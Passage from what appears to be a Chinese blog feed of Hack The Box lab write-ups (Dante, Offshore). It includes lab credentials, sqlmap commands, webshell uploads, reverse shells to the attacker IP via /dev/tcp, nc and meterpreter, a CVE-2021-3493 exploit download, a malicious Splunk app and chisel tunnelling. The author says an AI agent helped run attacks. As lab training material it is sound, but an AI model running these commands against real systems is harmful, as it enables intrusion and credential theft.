端口开放 172.16.2.5:88[5.0s] [*] 端口开放 172.16.2.5:445[5.0s] [*] 端口开放 172.16.2.5:139[5.0s] [*] 端口开放 172.16.2.5:389[5.0s] [*] 端口开放 172.16.2.6:22[8.0s]     扫描完成, 发现 7 个开放端口[8.0s]     存活端口数量: 7[8.0s]     开始漏洞扫描[8.1s]     POC加载完成: 总共387个，成功387个，失败0个[8.1s] [*] NetInfo 扫描结果目标主机: 172.16.2.5                                                   主机名: DANTE-DC02                                                    发现的网络接口:                                                           IPv4地址:          └─ 172.16.2.5    [8.1s] [+] NetBios 172.16.2.5      DC:DANTE\DANTE-DC02        [52.4s]     扫描已完成: 11/11
+
+发现还有一台2.6
+Linux:172.16.2.622端口
+在DC02的shell里直接ssh
+用户密码是元购表里的plongbottom:PowerfixSaturdayClub777
+
+
+直接sudo su提权
+
+
+
+
+flag12：DANTE{Alw4ys_check_th053_group5}
+Windows：172.16.1.101
+
+
+172.16.1.101
+DANTE-WS02
+21, 135, 139, 445
+SmbGhost (CVE-2020-0796) 漏洞
+
+
+
+ CVE-2020-0796  
+msf use exploit&#x2F;windows&#x2F;smb&#x2F;cve_2020_0796_smbghost 不稳定
+21：hydra 爆破，一对一对撞（-C 参数）  
+asmith:Princess1smoggat:Summer2019tmodle:P45678!ccraven:Password1kploty:Teacher65jbercov:4567Holiday1whaguey:acb123dcamtan:WorldOfWarcraft67tspadly:RopeBlackfieldForwardslashematlis:JuneJuly1TYfglacdon:FinalFantasy7tmentrso:65RedBalloonsdharding:WestminsterOrange5smillar:MarksAndSparks91bjohnston:Bullingdon1iahmed:Sheffield23plongbottom:PowerfixSaturdayClub777jcarrot:Tanenbaum0001lgesley:SuperStrongCantForget123456789
+
+hydra -C hydra.txt 172.16.1.101 ftp -V
+
+
+login: dharding   password: WestminsterOrange5
+登录
+Remote login.txt
+
+
+
+账号：dido
+密码规则：和 FTP 密码差不多，只是把数字 5 换成了其他数字（不是 5）
+
+不是这台的，先放着
+
+
+直接登录dharding
+proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
+
+
+flag13：DANTE{superB4d_p4ssw0rd_FTW}
+
+
+提权：
+试了土豆，不行
+
+
+IObitUnSvr  IObit 卸载服务程序
+IObitUnSvr 服务提权:服务以 LocalSystem 运行但 ImagePath 为空，且 dharding 对该服务有注册表写权限（SDDL 中的 WP 位）
+写注册表把服务路径改成添加管理员:
+sc config IObitUnSvr binPath= &quot;C:\Windows\System32\cmd.exe /c net localgroup administrators dharding /add&quot;
+
+启动服务（以SYSTEM执行上述命令）
+sc start IObitUnSvr
+
+服务启动”超时”报错（cmd不是长期运行的服务进程），但命令已执行——dharding 被加入 Administrators 组。
+权限生效
+当前 Evil-WinRM session 仍是中等完整性令牌，需重新连接刷新：
+proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
+
+重连后拿到 High Mandatory Level，Administrator 权限确认
+
+
+
+
+flag14:DANTE{Qu0t3_I_4M_secure!_unQu0t3}
+windows:172.16.1.5   proxychains ftp 172.16.1.5  
+
+
+flag15:DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
+Linux：172.16.1.12 XAMPP  
+
+
+
+172.16.1.12
+DANTE-NIX04
+21, 22, 80, 443, 3306
+运行 XAMPP
+
+
+
+https://172.16.1.12/blog/
+
+
+
+
+可注册登录。先注册一个用户
+
+
+
+
+尝试写码，不行，没权限
+有3306端口，找到sql注入点
+
+
+sqlmap
+sqlmap &#x27;https://172.16.1.12/blog/category.php?id=1&#x27; --dbs --batch --proxy socks5://localhost:1080 
+
+
+
+proxychains sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; -D flag --dump
+
+
+
+flag16:DANTE{wHy_y0U_n0_s3cURe?!?!}
+ blog_admin_db  :
+
+
+membership_userpermissions 权限表  :
+
+
+membership_users 表  :
+
+
+admin的哈希
+ 账号：admin 密码：admin  （好一个弱口令，我竟然没测😂）
+
+
+
+
+
+
+
+
+信息：
+ ben 的 md5：
+442179ad1de9c25593cabf625c0badb7
+
+ egre55   的 md5 ：
+d6501933a2e0ea1f497b87473051417f
+
+
+
+解一下：
+ben :Welcometomyblog
+ SSH 登录 ben
+
+
+
+
+
+
+flag12:DANTE{Pretty_Horrific_PH4IL!}
+sudo -l:
+
+
+看到(ALL, !root) &#x2F;bin&#x2F;bash，CVE-2019-14287 sudo 权限绕过漏洞
+**sudo -u#-1 &#x2F;bin&#x2F;bash**直接提 Root
+
+
+flag17:DANTE{sudo_M4k3_me_@_Sandwich}
+Windows: 172.16.1.102
+
+
+172.16.1.102
+DANTE-WS03
+80, 135, 139, 443, 445, 3306
+SmbGhost 漏洞，运行“Dante Marriage Registration System”
+
+
+
+
+
+
+
+
+
+登不进去
+
+
+Online Marriage Registration System 2020
+找洞，还真有exp   OMRS
+
+
+漏洞利用总结：
+漏洞链（未授权 → RCE）
+未授权访问 → 注册普通用户 → 登录 → 婚姻登记表单上传证件 → 无文件校验 → 上传 PHP webshell → 命令执行
+
+漏洞本质： 上传处无文件类型 &#x2F; 后缀校验，直接传 &lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;.php&lt;/font&gt; 不会被拦截  
+命令：
+# 攻击机开监听nc -lvnp 9001#上传ncproxychains python3 omrs.py -u http://172.16.1.102/ -c &#x27;powershell.exe wget 10.10.16.59:8000/nc.exe -O nc.exe&#x27;# 目标反弹proxychains python3 omrs.py -u http://172.16.1.102/ -c &#x27;nc.exe -e powershell.exe 10.10.16.59 9001&#x27;
+
+上传nc
+
+
+上传成功
+
+
+弹shell
+
+
+拿到shell
+
+
+
+
+flag18：DANTE{U_M4y_Kiss_Th3_Br1d3}
+
+
+提权：
+
+
+土豆：
+
+
+拿到system,直接读flag
+
+
+flag19：DANTE{D0nt_M3ss_With_MinatoTW}
+Linux：172.16.1.19
+
+
+172.16.1.19
+DANTE-NIX07
+80, 8080
+
+
+
+8080：
+
+
+之前DC02找到一个Jenkins.bat
+Admin_129834765 SamsungOctober102030
+登录
+
+
+
+
+直接给flag了
+flag20：DANTE{to_g0_4ward_y0u_mus7_g0_back}
+现在要拿shell,常见漏洞在Groovy 脚本控制台  
+&#x2F;script
+
+
+直接命令执行输出到页面上
+
+
+
+
+hostname: DANTE-NIX07
+etc&#x2F;passwd:
+root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:114::/run/uuidd:/usr/sbin/nologintcpdump:x:108:115::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologindnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologincups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologinspeech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falseavahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinkernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinsaned:x:117:123::/var/lib/saned:/usr/sbin/nologinnm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologinhplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/falsewhoopsie:x:120:125::/nonexistent:/bin/falsecolord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologinpulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologingnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/falselou:x:1000:1000:lou,,,:/home/lou:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinjenkins:x:126:133:Jenkins,,,:/var/lib/jenkins:/bin/bashmysql:x:127:135:MySQL Server,,,:/nonexistent:/bin/falseian:x:1001:1001:,,,:/home/ian:/bin/bash
+
+有用户 lou  ，ian
+直接弹shell
+def cmd = [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.59/9002 0&gt;&amp;1&quot;].execute()println(&quot;Shell sent!&quot;)
+
+
+
+
+
+提权：
+sudo等提权都不行
+用 linpeas.sh 扫一下
+
+
+有mysql,但是没扫到端口之前，也没找到密码
+ LinPEAS 扫出来有 CVE-2021-3493（Ubuntu OverlayFS） 提权漏洞  
+
+😭第二天起来发现入口机wordpress的Plugin因之前写🐎，都被杀了，新建新的也不行，找别的写🐎的地方也不行，参考wp打历史漏洞也不行，试试让agent直接帮我打。直接给我打出来了😍，直接rce且弹了shell。但是他老被杀，有没有什么解决方法呢？
+
+CVE-2021-3493 OverlayFS 提权：
+Kali编译(静态链接) → HTTP服务 → Jenkins wget下载 → 执行 → root
+wget -q https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O /tmp/exploit.c 2&gt;&amp;1
+
+gcc -static -o /tmp/exploit /tmp/exploit.c &amp;&amp; echo &quot;STATIC OK&quot;
+
+关键点：Kali上必须静态编译（gcc -static），因为.19的glibc版本低于Kali的2.34
+# Kali上编译+开HTTPgcc -static -o /tmp/exploit /tmp/exploit.ccd /tmp &amp;&amp; python3 -m http.server 8999# .19上下载+执行wget http://10.10.16.59:8999/exploit -O /tmp/exploitchmod +x /tmp/exploit/tmp/exploit
+
+
+
+
+
+flag21:DANTE{g0tta_&lt;3_ins3cur3_GROupz!}
+Windows ：172.16.1.13
+
+
+172.16.1.13
+DANTE-WS01
+80, 443, 445
+SmbGhost 漏洞，运行 XAMPP
+
+
+
+
+
+扫目录：
+有phpmyadmin，但是不能访问
+
+
+&#x2F;discuss
+
+
+&#x2F;discuss&#x2F;db&#x2F;有个sql文件
+
+
+admin、admin登录，管理员，但没东西，john 12345 也能登录
+
+
+头像文件上传
+
+
+上传111.php getshell
+rce了，先拿个flag
+
+
+flag22:DANTE{l355_t4lk_m04r_l15tening}
+但是一直谈不上shell
+cve：
+
+
+DANTE-WS01 (172.16.1.13) GetShell （agent帮忙整理）步骤1：注册用户上传webshelldiscuss论坛有历史漏洞——注册时头像上传可传PHP马。exec&#x2F;system都不可fork，用无fork命令直接写：
+1.1 注册并上传webshell（通过代理，Python脚本或直接curl）
+proxychains curl -s -X POST &#x27;http://172.16.1.13/discuss/registerH.php&#x27; -F &#x27;un=pwn123&#x27; -F &#x27;fn=pwn123&#x27; -F &#x27;pwd=pwned123&#x27; -F &#x27;e_mail=pwn123@test.com&#x27; -F &#x27;gender=1&#x27; -F &#x27;dob=1990-01-01&#x27; -F &#x27;add=test&#x27; -F &#x27;country=USA&#x27; -F &#x27;state=TX&#x27; -F &#x27;user_type=user&#x27; -F &#x27;ima=@shell.php;type=image/gif&#x27; 2&gt;/dev/null
+
+webshell内容（GIF header绕过检查）：
+GIF89a&lt;?php if(isset($_GET[&quot;c&quot;]))&#123;echo exec($_GET[&quot;c&quot;]);&#125;else&#123;echo&quot;X&quot;;&#125; ?&gt;
+
+→ PHP file + GIF header &#x3D; antivirus lets it through
+注册后文件在 &#x2F;discuss&#x2F;ups&#x2F; 目录下。
+步骤2：发现exec&#x2F;system不能forkexec&#x2F;system都返回”Unable to fork”——PHP配置限制。但可以执行不分叉的PHP代码。
+步骤3：写入system()版shell绕过验证
+ 通过exec写入新shell（echo &gt;&gt; 不需要fork）
+proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/x.php&#x27; \  --data-urlencode &#x27;c=echo ^&lt;?php echo system($_GET[&quot;c&quot;]); ?^&gt; &gt; C:\xampp\htdocs\discuss\ups\s.php&#x27; 2&gt;/dev/null
+
+s.php使用system()而非exec()，能执行大部分命令但后台进程仍然受限。
+步骤4：通过WMIC创建独立进程执行payloadsystem虽不能fork但可写文件、用wmic启动独立进程：
+# 4.1 生成MSF https payloadmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.59 LPORT=8443 -f exe -o /tmp/msf_https.exe# 4.2 Kali开HTTP服务cd /tmp &amp;&amp; python3 -m http.server 7780 &amp;# 4.3 通过s.php PowerShell下载（iwr不需要fork）proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/s.php&#x27; \  --data-urlencode &#x27;c=powershell -c iwr http://10.10.16.59:7780/msf_https.exe -OutFile C:\Windows\Temp\m.exe&#x27; 2&gt;/dev/null# 4.4 WMIC启动payload（独立进程，不依赖PHP fork）proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/s.php&#x27; \  --data-urlencode &#x27;c=wmic process call create C:\Windows\Temp\m.exe&#x27; 2&gt;/dev/null# 4.5 Kali MSF监听msfconsole -q -x &quot;use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.59; set LPORT 8443; set ExitOnSession false; run -j&quot;
+
+完整链：
+discuss论坛注册 → 头像上传PHP马(GIF header) → /ups/目录  → exec webshell(x.php) → echo写入system() shell(s.php)  → PowerShell下载MSF payload → WMIC独立进程执行  → meterpreter reverse_https → dante-ws01\gerald
+
+
+
+提权：
+在C:\Program Files (x86)\目录下发现Druva( 云端备份、勒索病毒防护、数据恢复工具）
+wmic service get name,pathname,startname | findstr /i &quot;druva&quot;
+
+输出：
+inSyncCPHService  “C:\Program Files (x86)\Druva\inSync\inSyncCPHwnet64.exe”  LocalSystem， 发现Druva以LocalSystem运行
+
+
+版本是6.6.3，找漏洞
+msf有exp
+
+
+use 0set SESSION 1set LHOST 10.10.16.59set LPORT 5555run
+
+
+
+
+
+flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}
+
+
+2026.7.19完——Echoin
+
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+        <tag>HTB</tag>
+        <tag>Dante</tag>
+        <tag>红队</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB Offshore 靶场 Writeup</title>
+    <url>/2026/08/14/htb-offshore/</url>
+    <content><![CDATA[简介离岸离岸是一个现实世界的企业环境，存在各种现代的Active Directory缺陷和配置错误。Offshore Corp 根据金融监管机构的合规要求，必须每季度进行渗透测试，并专注于补丁。公司已完成多项收购，被收购实体通过域名信托“连接”。如果你能够突破边界并立足，你的任务是探索企业环境，跨越信任界限，最终尝试破坏所有离岸公司实体。Offshore 将考验你对 Active Directory 枚举、利用和后利用，以及横向移动、枢轴和现代网络应用攻击的理解。有些旗帜是通过实验室推进的必需条件，而另一些则是支线任务，用来强化枚举和开发后技能。玩家可以提交旗帜以赢得离岸名人堂的席位，并在特定检查点收集徽章。这个渗透测试员二级实验室将让玩家接触到：枚举规避端点保护利用各种现实世界的Active Directory漏洞横向移动与跨越信托边界权限升级网络应用攻击入口：10.10.110.0/24
+
+信息收集 
+fscan:
+http://10.10.110.123       标题:ACME Bankhttp://10.10.110.124       标题:Offshore Devhttp://10.10.110.123:8000  标题:303 See Other 重定向地址: http://10.10.110.123:8000/zh-CN/https://10.10.110.123:8089       标题:无标题http://10.10.110.123:8000/zh-CN/ 标题:&quot;&quot;
+
+NIX01:10.10.110.123nmap 
+nmap -sC -sV 10.10.110.123 -A22/tcp   open  ssh      OpenSSH80/tcp   open  http     Apache8000/tcp open  http     Splunkd 8089/tcp open  ssl/http Splunkd httpd
+
+nmap -sC -sV 10.10.110.124 -A80/tcp open  http    Microsoft IIS httpd 10.0OS:Windows 2016|2012
+
+扫目录10.10.110.124
+
+
+
+
+flag1:OFFSHORE{d0nt_l3av3_f1l3s_ar0und}
+
+
+http://10.10.110.124/Login
+
+
+没什么信息
+看.123
+https://10.10.110.123:8089/
+
+
+Splunk 免费版远程登录被禁了
+发现，curl可以访问登录页面，但浏览器不可以
+
+
+
+
+搜索页面关键词，发现:
+&quot;version&quot;:&quot;7.0.2&quot;&quot;loginPasswordHint&quot;:&quot;changeme&quot;
+
+Splunk 7.0.2，密码提示直接就是 changeme
+浏览器试一下：打开无痕&#x2F;隐私窗口 → 访问 http://10.10.110.123:8000/en-US/account/login，还是跳转
+用curl登录并验证
+
+
+admin:changeme 登录成功
+Splunk 7.0.2 Free License
+核心原理：用 inputs.conf 脚本轮询，不依赖搜索命令和 license 限制。
+# === 1. 打包恶意 Splunk App ===rm -rf /tmp/revshell &amp;&amp; mkdir -p /tmp/revshell/bin /tmp/revshell/defaultcat &gt; /tmp/revshell/default/app.conf &lt;&lt; &#x27;EOF&#x27;[install]is_configured = 0state = enabled[package]id = revshellcheck_for_updates = 0[ui]is_visible = 1label = revshellEOFcat &gt; /tmp/revshell/default/inputs.conf &lt;&lt; &#x27;EOF&#x27;[script://./bin/rev.sh]interval = 10sourcetype = shelldisabled = falseindex = mainEOFcat &gt; /tmp/revshell/bin/rev.sh &lt;&lt; &#x27;REOF&#x27;#!/bin/bashbash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.84/4444 0&gt;&amp;1&#x27;REOFchmod +x /tmp/revshell/bin/rev.shcd /tmp &amp;&amp; rm -f revshell.tar.gz &amp;&amp; tar -czf revshell.tar.gz revshell/# === 2. 开监听 ===nc -lvnp 4444# === 3. 浏览器操作 ===# 登录 Splunk: http://10.10.110.123:8000  （这里会自动跳转，因为之前curl登录了）# Apps → Install app from file → 选 revshell.tar.gz → Upgrade 覆盖# Settings → Server controls → Restart Splunk# 等 30 秒弹 shell
+
+关键点：inputs.conf 的 scripted input 在 Splunk Free 版不被限制，每 10 秒自动执行一次，不需要搜索命令。之前用 commands.conf 失败就是因为 Free License 限制太多。
+
+
+
+
+flag2：OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
+信息收集：
+NIX01 内网 IP 172.16.1.23&#x2F;24
+mark@NIX01:/home/mark$ cat /etc/passwd | grep -E &quot;bash|sh$&quot;cat /etc/passwd | grep -E &quot;bash|sh$&quot;root:x:0:0:root:/root:/bin/bashsplunk:x:1002:1002:Splunk Server:/opt/splunk:/bin/bashpostgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+PostgreSQL 在本地，上传fscan
+root@NIX01:~# ./fscan -h 172.16.1.0/24┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘      Fscan Version: 2.0.1                                                                                                                                                            [2.0s]     已选择服务扫描模式                                                                                                                               [2.0s]     开始信息扫描[2.0s]     CIDR范围: 172.16.1.0-172.16.1.255[2.0s]     generate_ip_range_full[2.0s]     解析CIDR 172.16.1.0/24 -&gt; IP范围 172.16.1.0-172.16.1.255[2.0s]     最终有效主机数量: 256[2.0s]     开始主机扫描[2.0s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                               [2.0s] [*] 目标 172.16.1.23     存活 (ICMP)[2.0s] [*] 目标 172.16.1.15     存活 (ICMP)[2.0s] [*] 目标 172.16.1.22     存活 (ICMP)[2.0s] [*] 目标 172.16.1.30     存活 (ICMP)[2.0s] [*] 目标 172.16.1.220    存活 (ICMP)[2.0s] [*] 目标 172.16.1.201    存活 (ICMP)[2.0s] [*] 目标 172.16.1.200    存活 (ICMP)[2.0s] [*] 目标 172.16.1.36     存活 (ICMP)[2.0s] [*] 目标 172.16.1.24     存活 (ICMP)[2.0s] [*] 目标 172.16.1.5      存活 (ICMP)[2.0s] [*] 目标 172.16.1.101    存活 (ICMP)[5.0s]     存活主机数量: 11[5.0s]     有效端口数量: 233[5.1s] [*] 端口开放 172.16.1.22:3000[5.1s] [*] 端口开放 172.16.1.23:22[5.1s] [*] 端口开放 172.16.1.23:80[5.1s] [*] 端口开放 172.16.1.15:445[5.1s] [*] 端口开放 172.16.1.15:139[5.1s] [*] 端口开放 172.16.1.15:135[5.1s] [*] 端口开放 172.16.1.23:8000[5.1s] [*] 端口开放 172.16.1.30:445[5.1s] [*] 端口开放 172.16.1.30:135[5.1s] [*] 端口开放 172.16.1.23:8089[5.1s] [*] 端口开放 172.16.1.30:80[5.1s] [*] 端口开放 172.16.1.30:22[5.1s] [*] 端口开放 172.16.1.30:139[5.1s] [*] 端口开放 172.16.1.15:1433[5.1s] [*] 端口开放 172.16.1.220:445[5.1s] [*] 端口开放 172.16.1.220:389[5.1s] [*] 端口开放 172.16.1.220:139[5.1s] [*] 端口开放 172.16.1.220:135[5.1s] [*] 端口开放 172.16.1.220:88[5.1s] [*] 端口开放 172.16.1.201:139[5.1s] [*] 端口开放 172.16.1.201:135[5.1s] [*] 端口开放 172.16.1.201:80[5.1s] [*] 端口开放 172.16.1.201:21[5.1s] [*] 端口开放 172.16.1.201:445[5.1s] [*] 端口开放 172.16.1.200:139[5.1s] [*] 端口开放 172.16.1.200:135[5.1s] [*] 端口开放 172.16.1.200:389[5.1s] [*] 端口开放 172.16.1.200:88[5.1s] [*] 端口开放 172.16.1.200:445[6.1s] [*] 端口开放 172.16.1.36:139[6.1s] [*] 端口开放 172.16.1.36:135[6.1s] [*] 端口开放 172.16.1.36:445[7.1s] [*] 端口开放 172.16.1.24:445[7.1s] [*] 端口开放 172.16.1.24:139[7.1s] [*] 端口开放 172.16.1.24:135[7.1s] [*] 端口开放 172.16.1.24:80[8.0s] [*] 端口开放 172.16.1.5:88[8.0s] [*] 端口开放 172.16.1.5:135[8.0s] [*] 端口开放 172.16.1.5:389[8.0s] [*] 端口开放 172.16.1.5:445[8.0s] [*] 端口开放 172.16.1.5:139[8.0s] [*] 端口开放 172.16.1.101:139[8.0s] [*] 端口开放 172.16.1.101:135[8.0s] [*] 端口开放 172.16.1.101:445[9.1s]     扫描完成, 发现 44 个开放端口[9.1s]     存活端口数量: 44[9.1s]     开始漏洞扫描[9.2s] [+] 172.16.1.201 CVE-2020-0796 SmbGhost Vulnerable[9.2s] [*] 网站标题 http://172.16.1.30        状态码:200 长度:49748  标题:ManageEngine OpManager[9.2s] [*] 网站标题 http://172.16.1.23        状态码:200 长度:22567  标题:ACME Bank[9.2s] [*] NetInfo 扫描结果目标主机: 172.16.1.200                                                                                                                                      主机名: DC0                                                                                                                                                 发现的网络接口:                                                                                                                                             [9.3s] [*] NetInfo 扫描结果目标主机: 172.16.1.36                                                                                                                                       主机名: WSADM                                                                                                                                               发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.36                                                                                                                                        [9.3s]     POC加载完成: 总共387个，成功387个，失败0个[9.3s] [*] NetInfo 扫描结果目标主机: 172.16.1.201                                                                                                                                      主机名: JOE-LPTP                                                                                                                                            发现的网络接口:                                                                                                                                             [9.3s] [*] NetInfo 扫描结果目标主机: 172.16.1.220                                                                                                                                      主机名: SRV01                                                                                                                                               发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.220                                                                                                                                       [9.3s] [*] 网站标题 http://172.16.1.24        状态码:200 长度:3079   标题:Offshore Dev[9.4s] [*] NetInfo 扫描结果目标主机: 172.16.1.24                                                                                                                                       主机名: WEB-WIN01                                                                                                                                           发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.24                                                                                                                                        [9.4s] [*] NetInfo 扫描结果目标主机: 172.16.1.15                                                                                                                                       主机名: SQL01                                                                                                                                               发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.15                                                                                                                                        [9.4s] [*] NetInfo 扫描结果目标主机: 172.16.1.5                                                                                                                                        主机名: DC01                                                                                                                                                发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.5                                                                                                                                         [9.4s] [*] NetInfo 扫描结果目标主机: 172.16.1.101                                                                                                                                      主机名: WS02                                                                                                                                                发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.101                                                                                                                                       [9.4s] [+] NetBios 172.16.1.200    DC:LAB\DC0                 [9.4s] [*] NetInfo 扫描结果目标主机: 172.16.1.30                                                                                                                                       主机名: MS01                                                                                                                                                发现的网络接口:                                                                                                                                                IPv4地址:                                                                                                                                                      └─ 172.16.1.30                                                                                                                                        [9.4s]     系统信息 172.16.1.101 [Windows 7 Professional 7601 Service Pack 1][9.4s] [*] 网站标题 http://172.16.1.201       状态码:200 长度:696    标题:IIS Windows[9.4s] [+] NetBios 172.16.1.24     CORP\WEB-WIN01                [9.4s] [+] NetBios 172.16.1.201    JOE-LAB\JOE-LPTP              [9.4s] [+] NetBios 172.16.1.36     CORP\WSADM                    [9.4s] [+] NetBios 172.16.1.30     MS01.corp.local                     Windows Server 2016 Standard 14393[9.4s] [*] 网站标题 http://172.16.1.23:8000   状态码:303 长度:335    标题:303 See Other 重定向地址: http://172.16.1.23:8000/zh-CN/[9.5s]     系统信息 172.16.1.5 [Windows Server 2016 Standard 14393][9.5s] [+] NetBios 172.16.1.220    DC:SRV01.LAB.OFFSHORE.LOCAL      Windows Server 2016 Standard 14393[9.5s] [+] NetBios 172.16.1.5      DC:DC01.corp.local               Windows Server 2016 Standard 14393[9.5s] [+] NetBios 172.16.1.15     SQL01.corp.local                    Windows Server 2016 Standard 14393[9.5s]     系统信息 172.16.1.220 [Windows Server 2016 Standard 14393][9.5s] [+] FTP服务 172.16.1.201:21 匿名登录成功![9.5s] [*] 网站标题 https://172.16.1.23:8089  状态码:401 长度:453    标题:无标题[9.7s] [*] 网站标题 http://172.16.1.22:3000   状态码:401 长度:39     标题:无标题[9.9s] [*] 网站标题 http://172.16.1.23:8000/zh-CN/ 状态码:200 长度:13487  标题:&quot;&quot;[53.9s]     扫描已完成: 81/81
+
+fscan：（DC1）  三大域：CORP &#x2F; LAB &#x2F; JOE-LABCORP.LOCAL &#x2F; LAB.OFFSHORE.LOCAL &#x2F; JOE-LAB
+
+
+
+IP
+主机名
+域
+角色
+端口
+重要发现
+
+
+
+172.16.1.22
+—
+—
+仅存活
+—
+无开放端口
+
+
+172.16.1.5
+DC01
+corp.local
+🔴 DC
+88, 135, 139, 389, 445
+Win 2016
+
+
+172.16.1.15
+SQL01
+corp.local
+SQL
+135, 139, 445, 1433
+MSSQL
+
+
+172.16.1.23
+NIX01（拿下）
+corp.local
+🟢 入口机
+22, 80, 8000, 8089
+Splunk + ACME Bank
+
+
+172.16.1.24
+WEB-WIN01
+corp.local
+Web
+80, 135, 139, 445
+&#x3D; 10.10.110.124! 双网卡
+
+
+172.16.1.30
+MS01
+corp.local
+🔴 ManageEngine
+22, 80, 135, 139, 445
+OpManage（RCE）
+
+
+172.16.1.36
+WSADM
+corp.local
+工作站
+135, 139, 445
+—
+
+
+172.16.1.101
+WS02
+corp.local
+工作站
+135, 139, 445
+Win 7 SP1Win 7 + SMBv1 → MS17-010！
+
+
+172.16.1.201
+JOE-LPTP（拿下ftp）
+JOE-LAB
+🔴 FTP+Web
+21, 80, 135, 139, 445
+FTP匿名!    SmbGhost!
+
+
+172.16.1.200
+DC0
+LAB.OFFSHORE.LOCAL
+🔴 DC
+88, 135, 139, 389, 445
+域: LAB
+
+
+172.16.1.220
+SRV01
+LAB.OFFSHORE.LOCAL
+🔴 DC
+88, 135, 139, 389, 445
+—
+
+
+挂代理(挂在入口机）
+# setsid 后台启动，脱离会话 —— shell 断了代理也活着setsid ./chisel client 10.10.14.84:12345 R:socks &gt;/tmp/chisel.log 2&gt;&amp;1 &lt; /dev/null &amp;# 等 3 秒确认连上sleep 3 &amp;&amp; cat /tmp/chisel.log
+
+1️⃣主域corp.localNIX01:172.16.1.23 （PostgreSQL RCE提权）之前信息收集：
+NIX01 内网 IP 172.16.1.23&#x2F;24
